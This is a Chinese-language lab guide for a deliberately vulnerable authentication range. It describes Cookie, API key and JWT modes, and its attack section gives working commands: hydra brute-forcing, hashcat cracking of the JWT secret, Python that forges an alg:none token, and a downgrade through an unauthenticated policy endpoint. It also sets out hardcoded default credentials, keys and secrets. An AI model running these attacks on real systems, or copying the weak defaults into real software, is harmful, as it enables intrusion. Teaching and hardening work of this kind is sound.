---
title: "AISecLab 多模式认证架构与靶机实验指南"
classification: "public"
category: "training"
document_type: "lab_guide"
version: "0.5.0"
last_updated: "2026-07-09"
---

# AISecLab 多模式认证架构与靶机实验指南

## 1. 概述

AISecLab 0.5.0 实现了 **Cookie / API Key / JWT 三种认证模式 + 三种认证策略的组合架构**，认证通道可独立启停、策略可运行时切换，专为 AI 安全靶机实验环境设计。

### 设计目标

| 目标 | 说明 |
|------|------|
| **多模式共存** | Cookie Session、API Key、JWT Bearer Token 三种模式并行工作 |
| **多策略组合** | any（单通道 OR）、cookie_apikey_and（双层 AND）、high_security（高安全）|
| **独立启停** | 每种模式通过环境变量 `LAB_AUTH_MODE_*` 独立控制 |
| **运行时可切换** | 认证策略通过 Web UI 或 API 实时切换，无需重启 |
| **训练友好** | 默认使用弱密钥/弱配置，便于演示常见攻击向量 |
| **攻击面可见** | 提供 debug 端点和 metadata 端点，方便信息收集演练 |
| **分层防御验证** | 支持对比单通道 vs 双层 AND 的安全性差异 |

---

## 2. 认证架构

### 2.1 整体流程图

```
HTTP 请求 → Session 中间件（解析 Cookie）
         → 安全响应头中间件
         → 认证中间件（根据 _auth_policy 决定策略）
            │
            ├─ Policy: "any" (单通道 OR)
            │   ├─ Mode 1: Cookie Session  ─── lab_session (Fernet 加密)
            │   ├─ Mode 2: API Key        ─── x-api-key / Bearer raw key
            │   └─ Mode 3: JWT Token      ─── Bearer <jwt_token>
            │
            ├─ Policy: "cookie_apikey_and" (双层 AND)
            │   ├─ Layer 1: Cookie Session ─── 必须已登录
            │   └─ Layer 2: API Key       ─── 必须提供有效 Key
            │
            └─ Policy: "high_security" (高安全)
                ├─ Layer 1: Cookie Session ─── 必须已登录
                └─ Layer 2: Admin API Key ─── 必须提供 admin 角色 Key
         →
         响应 → 注入 X-Auth-Method 头（cookie/apikey/cookie+apikey/high_security）
```

### 2.2 认证策略 (Auth Policy)

认证策略控制多个认证通道之间的**组合逻辑**，通过 `_auth_policy` 运行时变量控制：

| 策略 | 代码 | 逻辑 | 说明 |
|------|------|------|------|
| **any** | `"any"` | Cookie **OR** API Key **OR** JWT | 任一凭证有效即通过（默认，覆盖 90% 真实场景）|
| **cookie_apikey_and** | `"cookie_apikey_and"` | Cookie **AND** API Key | 两者必须同时有效，模拟企业 AI 网关分层认证 |
| **high_security** | `"high_security"` | Cookie **AND** Admin API Key | Cookie + admin 角色 API Key，JWT 禁用，模拟金融/军工级 |

**切换方式：**

```bash
# API 方式
curl -X POST https://localhost/api/v1/auth/policy \
  -H "Content-Type: application/json" \
  -d '{"policy":"cookie_apikey_and"}'

# Web UI 方式
# 访问 /ai/admin/lab → 观测台 → 认证策略切换面板，点击对应按钮
```

### 2.3 认证决策伪代码

```
authenticate_request(request):
  policy = _auth_policy

  if policy == "any":
    # ── 单通道 OR：依次尝试，首个匹配通过 ──
    if COOKIE_ENABLED and session.lab_authenticated:
      return (True, "cookie")
    if APIKEY_ENABLED:
      key = extract from x-api-key || Bearer (non-JWT) || ?api_key=
      if key in API_KEYS_POOL:
        return (True, "apikey", {role: key.role})
    if JWT_ENABLED:
      token = extract Bearer token
      payload = verify_jwt(token, JWT_SECRET)
      return (True, "jwt", {sub: payload.sub, role: payload.role})
    return (False, "none")

  elif policy == "cookie_apikey_and":
    # ── 双层 AND：两层都必须通过 ──
    if not session.lab_authenticated:
      return (False, "none")  # 第一层失败
    key = extract api_key from request
    if key not in API_KEYS_POOL:
      return (False, "none")  # 第二层失败
    return (True, "cookie+apikey", {user: cookie_user, role: key.role})

  elif policy == "high_security":
    # ── 高安全：Cookie + Admin API Key AND ──
    if not session.lab_authenticated:
      return (False, "none")
    key = extract api_key from request
    if key not in API_KEYS_POOL or key.role != "admin":
      return (False, "none")
    return (True, "high_security", {user: cookie_user, role: "admin"})
```

### 2.3 豁免路径

以下路径不经过认证中间件：

| 路径前缀 | 说明 |
|----------|------|
| `/static/` | 静态资源 |
| `/login` | 登录页面和 API |
| `/logout` | 登出 |
| `/api/v1/auth/` | 认证 API 自身 |
| `/api/v1/health`, `/api/health` | 健康检查 |
| `/robots.txt` | 机器人协议 |

---

## 3. 三种认证模式详解

### 3.1 Cookie Session 模式

| 属性 | 值 |
|------|-----|
| **存储载体** | `lab_session` Cookie |
| **加密算法** | Fernet (AES-128-CBC + HMAC-SHA256) |
| **密钥来源** | `LAB_SESSION_SECRET` 环境变量 |
| **默认 TTL** | 24 小时 (86400 秒) |
| **Cookie 属性** | HttpOnly=True, SameSite=Lax |
| **HTTPS** | Secure=True (取决于请求协议) |

**登录方式：**
```
POST /login
Content-Type: application/json

{"username": "admin", "password": "admin"}
```

**靶机训练向量：**
- Cookie 窃取（XSS 或中间人攻击）
- Session Fixation（固定会话攻击）
- 弱 Fernet 密钥暴力破解
- Cookie 属性缺失利用（如缺少 Secure 标记）

**加固建议：**
- `LAB_SESSION_SECRET` 使用强随机值
- 启用 HTTPS + Secure Cookie
- 添加 CSRF Token
- 登录后轮换 Session ID

### 3.2 API Key 模式

| 属性 | 值 |
|------|-----|
| **传递方式** | `x-api-key` header / `Authorization: Bearer <key>` / `?api_key=<key>` |
| **密钥池** | 环境变量 `LAB_API_KEYS` |
| **角色模型** | 每个 key 绑定 name + role (admin/user/viewer) |
| **默认密钥** | 3 个预设 key（见下表） |

**默认 API Key 池：**

| Key | Name | Role |
|-----|------|------|
| `sk-guardai-prod-2026` | production | admin |
| `sk-guardai-dev-2026` | development | user |
| `sk-guardai-test-2026` | test | viewer |

**使用示例：**
```bash
# x-api-key header
curl -H "x-api-key: sk-guardai-prod-2026" https://localhost/api/v1/user/me

# Bearer (非 JWT 格式)
curl -H "Authorization: Bearer sk-guardai-dev-2026" https://localhost/api/v1/frameworks/overview

# Query parameter
curl "https://localhost/api/v1/health?api_key=sk-guardai-test-2026"
```

**靶机训练向量：**
- API Key 泄露于代码仓库/日志
- 硬编码密钥扫描发现
- 越权使用低权限 key 访问高权限资源
- API Key 枚举/爆破
- Bearer token 与 API Key 格式混淆攻击

**加固建议：**
- API Key 使用 `sk-` 前缀 + 64 字符随机串
- 生产环境移除弱默认 key
- 实施 key 轮换机制
- 添加 key 使用审计日志
- 限制 key 的 IP 白名单

### 3.3 JWT Token 模式

| 属性 | 值 |
|------|-----|
| **默认算法** | HS256 (HMAC-SHA256) |
| **默认密钥** | `guardai-training-jwt-secret-2026` |
| **支持算法** | HS256, HS384, HS512, none |
| **默认 TTL** | 24 小时 |
| **标准 Claims** | sub, role, iat, exp, iss, aud |
| **Token 端点** | `POST /api/v1/auth/token` |
| **验证端点** | `POST /api/v1/auth/token/verify` |
| **Debug 端点** | `GET /api/v1/auth/token/debug` |

**获取 Token：**
```bash
curl -X POST https://localhost/api/v1/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin", "role": "admin"}'
```

**使用 Token：**
```bash
curl -H "Authorization: Bearer <jwt_token>" https://localhost/api/v1/user/me
```

**靶机训练向量：**

| 攻击类型 | 说明 | 难度 |
|----------|------|------|
| **弱密钥破解** | 默认密钥 `guardai-training-jwt-secret-2026` 可离线爆破 | 低 |
| **alg:none 绕过** | 将 header.alg 改为 "none"，空签名绕过验证 | 低 |
| **密钥泄露** | `/api/v1/auth/token/debug` 暴露密钥长度和提示 | 低 |
| **Role 提权** | 修改 payload.role 从 "user" 到 "admin" | 中 |
| **exp 过期延长** | 修改 exp 时间戳延长 token 有效期 | 低 |
| **kid 注入** | 如果扩展支持 kid header 可实现路径遍历 | 中 |
| **jku/x5u 劫持** | 如果扩展支持 jku header 可实现 SSRF | 高 |

**JWT Debug 端点暴露的信息：**
```json
{
  "algorithm": "HS256",
  "secret_hint": "guardai-training-****",
  "secret_length": 34,
  "header_template": {"alg": "HS256", "typ": "JWT"},
  "payload_template": {"sub": "<username>", "role": "<role>"},
  "training_focus": [
    "JWT 弱密钥暴力破解",
    "alg:none 签名绕过",
    "exp 过期时间篡改",
    "role 提权伪造"
  ]
}
```

**加固建议：**
- 使用 RS256/ES256 替代 HS256
- JWT Secret 使用至少 256 位随机值
- 禁用 alg:none 算法
- 实施 Token 黑名单/撤销机制
- 关闭 Debug 端点
- 添加 `nbf` (Not Before) 和 `jti` (JWT ID) claims
- 限制 Token TTL 为 15-60 分钟

---

## 4. 环境变量配置参考

### 4.1 认证启停控制

```bash
# .env 配置文件

# ── 全局认证开关 ──
LAB_AUTH_ENABLED=1                    # 1=启用, 0=关闭全部认证

# ── 独立模式开关 ──
LAB_AUTH_MODE_COOKIE=1                # Cookie Session 模式
LAB_AUTH_MODE_APIKEY=1                # API Key 模式
LAB_AUTH_MODE_JWT=1                   # JWT Token 模式

# ── Cookie 配置 ──
LAB_AUTH_USERNAME=admin               # 登录用户名
LAB_AUTH_PASSWORD=admin               # 登录密码（自动哈希存储）
LAB_SESSION_SECRET=<random_hex_64>    # Fernet 加密密钥（默认随机生成）

# ── JWT 配置 ──
LAB_JWT_SECRET=guardai-training-jwt-secret-2026
LAB_JWT_ALGORITHM=HS256
LAB_JWT_EXPIRATION_HOURS=24

# ── API Key 配置 ──
LAB_API_KEYS=production:sk-guardai-prod-2026:admin,development:sk-guardai-dev-2026:user,test:sk-guardai-test-2026:viewer

# ── 认证策略 ──
LAB_AUTH_POLICY=any                    # any | cookie_apikey_and | high_security
```

### 4.2 靶机实验场景配置

| 场景 | LAB_AUTH_MODE_COOKIE | LAB_AUTH_MODE_APIKEY | LAB_AUTH_MODE_JWT | LAB_AUTH_POLICY | 训练目标 |
|------|:---:|:---:|:---:|------|------|
| **场景 A: 全开模式** | 1 | 1 | 1 | any | 攻击面最大化，全面探索 |
| **场景 B: 仅 Cookie** | 1 | 0 | 0 | any | 专注 Cookie/Session 攻击 |
| **场景 C: 仅 API Key** | 0 | 1 | 0 | any | 专注 API Key 泄露与滥用 |
| **场景 D: 仅 JWT** | 0 | 0 | 1 | any | 专注 JWT 签名/算法攻击 |
| **场景 E: Cookie+JWT** | 1 | 0 | 1 | any | 双因素绕过、token 劫持 |
| **场景 F: 全关模式** | 0 | 0 | 0 | any | 基线—无认证可访问 |
| **场景 G: 双层 AND** | 1 | 1 | 1 | **cookie_apikey_and** | 需同时击穿 Cookie + API Key 两道防线 |
| **场景 H: 高安全模式** | 1 | 1 | 1 | **high_security** | 需 Cookie + Admin API Key，非 admin Key 被拒 |

---

## 5. API 端点参考

### 5.1 认证端点

| 方法 | 路径 | 认证要求 | 说明 |
|------|------|----------|------|
| `GET` | `/api/v1/auth/status` | 无 | 当前认证状态、策略和可用模式 |
| `GET` | `/api/v1/auth/modes` | 无 | 所有认证模式详情及当前策略 |
| `POST` | `/api/v1/auth/policy` | 无 | 切换认证策略 (any/cookie_apikey_and/high_security) |
| `POST` | `/login` | 无 | 用户名+密码登录获取 Cookie |
| `GET` | `/logout` | Cookie | 清除 Session Cookie |
| `POST` | `/api/v1/auth/toggle` | Cookie | 运行时切换认证总开关 |
| `POST` | `/api/v1/auth/token` | 凭据 | 签发 JWT Bearer Token |
| `POST` | `/api/v1/auth/token/verify` | JWT | 验证 JWT Token 有效性 |
| `GET` | `/api/v1/auth/token/debug` | 无 | JWT 调试信息（故意暴露）|
| `POST` | `/api/v1/auth/apikey` | admin | 签发新 API Key |
| `GET` | `/api/v1/auth/apikeys` | admin | 列出所有 API Key（脱敏）|

#### 策略切换示例

```bash
# 切换到双层 AND 模式
curl -X POST https://localhost/api/v1/auth/policy \
  -H "Content-Type: application/json" \
  -d '{"policy":"cookie_apikey_and"}'

# 高安全模式
curl -X POST https://localhost/api/v1/auth/policy \
  -H "Content-Type: application/json" \
  -d '{"policy":"high_security"}'

# 恢复默认单通道模式
curl -X POST https://localhost/api/v1/auth/policy \
  -H "Content-Type: application/json" \
  -d '{"policy":"any"}'
```

### 5.2 认证方式到 API

```bash
# Cookie 方式
curl -c cookies.txt -X POST https://localhost/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
curl -b cookies.txt https://localhost/api/v1/user/me

# API Key 方式
curl -H "x-api-key: sk-guardai-prod-2026" https://localhost/api/v1/frameworks/overview

# JWT 方式
TOKEN=$(curl -s -X POST https://localhost/api/v1/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","role":"admin"}' | jq -r '.access_token')
curl -H "Authorization: Bearer $TOKEN" https://localhost/api/v1/user/me
```

---

## 6. 靶机实验建议

### 6.1 信息收集阶段

1. **健康检查探测**
   ```bash
   curl https://localhost/api/v1/health
   # → 获取 auth_modes、auth_policy 配置，了解启用了哪些模式和当前策略
   ```

2. **认证模式枚举**
   ```bash
   curl https://localhost/api/v1/auth/modes
   # → 获取各模式详细配置及当前策略
   ```

3. **策略探测（新增）**
   ```bash
   curl https://localhost/api/v1/auth/modes | jq '.auth_policy'
   # → 了解目标是 any / cookie_apikey_and / high_security
   # → 如果非 any，需要同时击穿 Cookie + API Key 两道防线
   ```

4. **401 响应分析**
   ```bash
   curl -i https://localhost/api/v1/user/me
   # → 查看 auth_policy 和 available_auth_modes 字段
   # → 了解当前策略要求的认证方式
   ```

5. **JWT 信息泄露**
   ```bash
   curl https://localhost/api/v1/auth/token/debug
   # → 获取 JWT 算法、密钥长度、模板
   # ⚠️ 在 high_security 策略下 JWT 被禁用，此端点仍可访问但 token 无法使用
   ```

6. **API Key 探测**
   ```bash
   # 尝试常见 API Key 前缀
   curl -H "x-api-key: sk-guardai-prod-2026" https://localhost/api/v1/user/me
   curl -H "x-api-key: sk-test-1234" https://localhost/api/v1/user/me
   ```

### 6.2 攻击阶段

#### Cookie Session 攻击

1. **弱凭据爆破**
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt \
     localhost https-post-form "/login:username=^USER^&password=^PASS^:用户名或密码错误"
   ```

2. **Cookie 窃取** - 利用 XSS 或无 HTTPS 中间人
3. **Session Fixation** - 预设 `lab_session` Cookie 值

#### API Key 攻击

1. **密钥扫描**
   ```bash
   grep -r "sk-guardai" ./
   trufflehog filesystem ./
   ```

2. **多载体测试**
   ```bash
   # x-api-key header
   curl -H "x-api-key: sk-guardai-dev-2026" https://localhost/api/v1/admin/logs

   # Bearer (raw key)
   curl -H "Authorization: Bearer sk-guardai-dev-2026" https://localhost/api/v1/admin/logs

   # Query parameter
   curl "https://localhost/api/v1/admin/logs?api_key=sk-guardai-dev-2026"
   ```

3. **权限提升** - 用 viewer key 尝试 admin 端点

#### JWT 攻击

1. **alg:none 绕过**
   ```python
   import base64, json
   header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
   payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","exp":9999999999}).encode()).rstrip(b"=")
   token = f"{header.decode()}.{payload.decode()}."
   ```

2. **弱密钥破解**
   ```bash
   hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
   # 密钥为: guardai-training-jwt-secret-2026
   ```

3. **Role 提权** - 解码 token → 改 role → 使用正确密钥重新签名

#### 分层认证对抗（场景 G/H 专用）

**策略探测：**
```bash
# 1. 先发现当前策略
curl -s https://localhost/api/v1/auth/modes | jq '.auth_policy'
# "cookie_apikey_and" 或 "high_security"

# 2. 查看 401 响应了解要求
curl -i https://localhost/api/v1/user/me
# → available_auth_modes 会说明具体需要什么
```

**Cookie + API Key AND 绕过（场景 G）：**
```bash
# 攻击路径：需要同时拥有 Cookie 和 API Key
# Step 1: 获取 Cookie（社工/弱密码/XSS）
curl -c cookies.txt -X POST https://localhost/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Step 2: 同时携带 Cookie 和 API Key
curl -b cookies.txt -H "x-api-key: sk-guardai-prod-2026" \
  https://localhost/api/v1/user/me

# 注意：仅 Cookie 或仅 API Key 都会返回 401
# 必须同时通过两层，响应头 X-Auth-Method 会显示 "cookie+apikey"
```

**高安全模式绕过（场景 H）：**
```bash
# 要求：Cookie + Admin 角色 API Key
# user/viewer 角色的 Key 会被拒绝

# 尝试 user Key → 被拒绝（role != admin）
curl -b cookies.txt -H "x-api-key: sk-guardai-dev-2026" \
  https://localhost/api/v1/user/me
# → 401

# 使用 admin Key → 通过
curl -b cookies.txt -H "x-api-key: sk-guardai-prod-2026" \
  https://localhost/api/v1/user/me
# → 200, X-Auth-Method: high_security

# JWT 在此模式下被禁用，即使有有效 JWT 也无法通过
curl -H "Authorization: Bearer <valid_jwt>" \
  https://localhost/api/v1/user/me
# → 401
```

**策略切换利用（红队技巧）：**
```bash
# 如果发现 /api/v1/auth/policy 端点无需认证即可调用
# 可以尝试将策略降级为 any 模式
curl -X POST https://localhost/api/v1/auth/policy \
  -H "Content-Type: application/json" \
  -d '{"policy":"any"}'
# → 切换回单通道 OR，攻击面恢复最大
```

### 6.3 验证与评分

系统通过以下方式记录和评估攻击行为：
- **Audit Events**: 所有认证事件记录到 audit log
- **X-Auth-Method**: 响应头标识使用的认证方法
- **Attack Events**: 安全模块记录攻击尝试
- **Challenge Progress**: 实验模块追踪任务完成度

---

## 7. 安全加固清单

### 7.1 即时加固（低难度）

- [ ] 修改默认 `LAB_AUTH_PASSWORD`
- [ ] 设置强随机 `LAB_SESSION_SECRET`
- [ ] 修改 `LAB_JWT_SECRET` 为强随机值
- [ ] 移除默认 `LAB_API_KEYS` 中的弱 key
- [ ] 确保生产环境启用 HTTPS
- [ ] 设置 `LAB_AUTH_POLICY=high_security` 启用高安全模式
- [ ] 限制 `/api/v1/auth/policy` 端点访问（当前无认证要求）

### 7.2 进阶加固（中难度）

- [ ] JWT 算法切换为 RS256/ES256
- [ ] 禁用 alg:none 算法
- [ ] 实施 Token 黑名单（登出失效）
- [ ] 添加 CSRF Token 保护
- [ ] 策略切换端点加 admin 权限校验
- [ ] API Key 使用 `sk-` + 64 字符随机串
- [ ] 限制 JWT TTL 为 15 分钟

### 7.3 纵深防御（高难度）

- [ ] 实施 API Key 轮换 + 审计日志
- [ ] 添加 IP 白名单 + 地理位置检查
- [ ] 实施设备指纹
- [ ] 集成 MFA/WebAuthn
- [ ] 部署 API Gateway 统一认证
- [ ] 关闭所有 debug/元数据泄露端点
- [ ] 实施 Rate Limiting by API Key

---

## 8. 附录

### 8.1 角色权限矩阵

| 端点 | admin | user | viewer | 未认证 |
|------|:---:|:---:|:---:|:---:|
| `GET /api/v1/health` | [OK] | [OK] | [OK] | [OK] |
| `GET /api/v1/auth/modes` | [OK] | [OK] | [OK] | [OK] |
| `GET /api/v1/user/me` | [OK] | [OK] | [OK] | 401 |
| `POST /api/v1/auth/apikey` | [OK] | 403 | 403 | 403/401 |
| `GET /api/v1/auth/apikeys` | [OK] | 403 | 403 | 403/401 |
| `GET /api/v1/admin/logs` | [OK] | 403 | 403 | 403 |

### 8.2 响应头参考

| 响应头 | 值 | 说明 |
|--------|----|------|
| `X-Auth-Method` | cookie/apikey/jwt | 当前请求使用的认证方式 |
| `X-RateLimit-Limit` | 30 | 速率限制上限 |
| `X-RateLimit-Remaining` | 动态 | 剩余请求配额 |
| `X-Content-Type-Options` | nosniff | 防止 MIME 嗅探 |
| `X-Frame-Options` | DENY | 防止点击劫持 |
| `Strict-Transport-Security` | max-age=31536000 | HSTS (HTTPS 连接时) |

### 8.3 依赖与版本

| 组件 | 版本 | 用途 |
|------|------|------|
| `cryptography` | >= 42.0.0 | Fernet 加密 (Cookie Session) |
| `bcrypt` | >= 4.0.0 | 密码哈希 |
| `python-multipart` | >= 0.0.9 | 表单数据解析 |
| `fastapi` | >= 0.111.0 | Web 框架 |

### 8.4 变更记录

| 日期 | 版本 | 变更 |
|------|------|------|
| 2026-07-09 | 0.4.0 | 多模式认证架构：Cookie + API Key + JWT 组合认证 |
